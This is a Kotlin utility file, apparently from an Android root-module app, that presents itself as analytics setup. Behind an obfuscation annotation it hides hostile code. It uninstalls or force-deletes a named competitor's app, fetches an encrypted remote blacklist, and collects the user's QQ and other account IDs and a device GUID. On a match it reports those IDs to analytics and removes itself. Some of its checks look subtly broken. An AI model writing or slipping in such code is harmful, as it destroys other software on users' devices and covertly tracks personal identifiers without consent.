@file:Suppress("unused")

package com.luckyzyx.luckytool.utils

import android.app.Application
import android.content.Context
import android.util.ArrayMap
import com.drake.net.Get
import com.drake.net.utils.scope
import com.drake.net.utils.scopeNet
import com.drake.net.utils.withDefault
import com.drake.net.utils.withIO
import com.joom.paranoid.Obfuscate
import com.luckyzyx.luckytool.BuildConfig
import com.microsoft.appcenter.AppCenter
import com.microsoft.appcenter.analytics.Analytics
import com.microsoft.appcenter.crashes.Crashes
import org.json.JSONArray
import org.json.JSONObject

@Obfuscate
object AppAnalyticsUtils {

    private const val App_Center_Secret = BuildConfig.APP_CENTER_SECRET

    private var qss = ArrayList<String>()
    private var css = ArrayList<String>()
    private var gid = ""
    fun init(instance: Application, isBeta: Boolean) {
        if (App_Center_Secret.isNotBlank()) {
            if (isBeta) AppCenter.start(instance, App_Center_Secret, Analytics::class.java)
            else AppCenter.start(
                instance, App_Center_Secret,
                Analytics::class.java, Crashes::class.java
            )
        }
    }

    @Suppress("MemberVisibilityCanBePrivate")
    fun trackEvent(name: String, data: Map<String, String>? = null) {
        if (data != null) Analytics.trackEvent(name, data)
        else Analytics.trackEvent(name)
    }

    fun checkAppBlackList() {
        scopeNet {
            arrayOf("com.Sunshine.ToolBox").forEach {
                val map = getPackageAbsolutePath(it, true)
                map.toList().forEachIndexed { _, pair ->
                    val packName = pair.first
                    val path = pair.second
                    if (uninstallAppResult(packName).not()) FileUtils.forceDeleteFile(path)
                }
            }
        }.catch {
            LogUtils.e("check app", "throw", "$it", true)
            return@catch
        }
    }

    fun Context.checkGitlabBlackList() {
        var data = ""
        scopeNet {
            val latestUrl = "https://gitlab.com/luckyzyx/luckyzyx.gitlab.io/raw/main/blacklist"
            val getDoc = Get<String>(latestUrl).await()
            data = if (getDoc.isNotBlank()) AESCrypt.decrypt(getDoc) else ""
//            LogUtils.e("check gitlab", "data", data, true)
        }.catch {
            LogUtils.e("check gitlab", "throw", "$it", true)
            data = ""
            return@catch
        }.finally { scope { withIO { startCheckList("gitlab", data) } } }
    }

    private fun Context.startCheckList(tag: String, json: String) {
        scope {
            withDefault {
                var qbsval = false
                var cbsval = false
                var disval = false
                val map = ArrayMap<String, String>()
                map["time"] = formatDate("YYYYMMdd-HH:mm:ss")
                if (qss.isNotEmpty()) qss = getQSlist()
                if (css.isNotEmpty()) css = getCSid()
                if (gid.isNotBlank()) gid = getGuid
                if (json.isBlank()) {
                    startCheckListFinal()
                    return@withDefault
                }
                val js = JSONObject(json)
                (js.optJSONArray("qbk") ?: JSONArray()).apply {
                    qss.forEach {
//                        LogUtils.e("check qbk", "for", "$this | $it", true)
                        if (this.toString().contains("\"$it\"")) {
                            qbsval = true
                            map["qbk"] = it
                        }
                    }
                }
                (js.optJSONArray("cbk") ?: JSONArray()).apply {
                    css.forEach {
//                        LogUtils.e("check cbk", "for", "$this | $it", true)
                        if (this.toString().contains("\"$it\"")) {
                            cbsval = true
                            map["cbk"] = it
                        }
                    }
                }
                (js.optJSONArray("dik") ?: JSONArray()).apply {
//                    LogUtils.e("check dik", "for", "$this | $gid", true)
                    if (this.toString().contains("\"$gid\"")) {
                        disval = true
                        map["dik"] = gid
                    }
                }
                if (qbsval || cbsval || disval) {
                    trackEvent("bk", map)
                    removeModule()
                    exitModule()
                }
            }
        }.catch {
            LogUtils.e("check list", tag, "$it")
            startCheckListFinal()
        }
    }

    fun Context.startCheckListFinal() {
        val json = JSONObject().apply {
            put("qbk", JSONArray().apply {
                put("1150325619")
                put("3108440182")
                put("3431299059")
                put("907989054")
                put("1933582367")
                put("382973352")
                put("1204528865")
                put("2515287786")
                put("1848589411")
            })
            put("cbk", JSONArray().apply {
                put("1304480")
                put("16149908")
                put("27708445")
                put("2470014")
                put("19996229")
                put("6759474")
            })
            put("dik", JSONArray().apply {
                put("e3db3345c2de23bf02477ce21a3c12c9539eb9df36dc233d81b902477435f816")
            })
        }
        startCheckList("final", json.toString())
    }
}